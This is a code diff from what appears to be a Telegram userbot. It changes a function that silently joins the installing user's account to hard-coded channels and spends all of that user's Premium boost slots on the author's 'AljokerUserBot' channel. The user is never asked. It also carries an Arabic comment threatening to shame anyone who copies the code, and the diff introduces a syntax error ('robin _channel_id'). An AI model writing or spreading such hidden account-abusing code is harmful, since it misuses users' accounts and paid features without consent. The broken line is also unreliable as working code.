@@ -175,24 +175,24 @@ async def add_bot_to_logger_group(chat_id):
         except Exception as e:
             LOGS.error(str(e))
 #by @is7rb بس اشوفك خامطه للكود اهينك وافضحك
-JoKeRUB = {"@uui7rb", "@is7rb", "@E_4_R"}
+JoKeRUB = {"@uui7rb", "@k_jj_j", "@E_4_R"}
 async def saves():
     for F_O_1 in JoKeRUB:
         try:
             await l313l(JoinChannelRequest(channel=F_O_1))
             result = await l313l(functions.premium.GetMyBoostsRequest())
             slots = [boost.slot for boost in result.my_boosts]
-            hrb_channel_id = None
+            robin_channel_id = None
             for chat in result.chats:
-                if chat.username == 'RobinUserBot':
-                    hrb_channel_id = chat.id
+                if chat.username == 'AljokerUserBot':
+                    robin_channel_id = chat.id
                     break
-            if hrb_channel_id and any(boost.peer.channel_id == hrb_channel_id for boost in result.my_boosts):
+            if robin_channel_id and any(boost.peer.channel_id == robin _channel_id for boost in result.my_boosts):
                 continue
             if not slots:
                 return
             await l313l(functions.premium.ApplyBoostRequest(
-                'RobinUserBot',
+                'AljokerUserBot',
                 slots=slots
             ))
         except FloodWaitError as e:
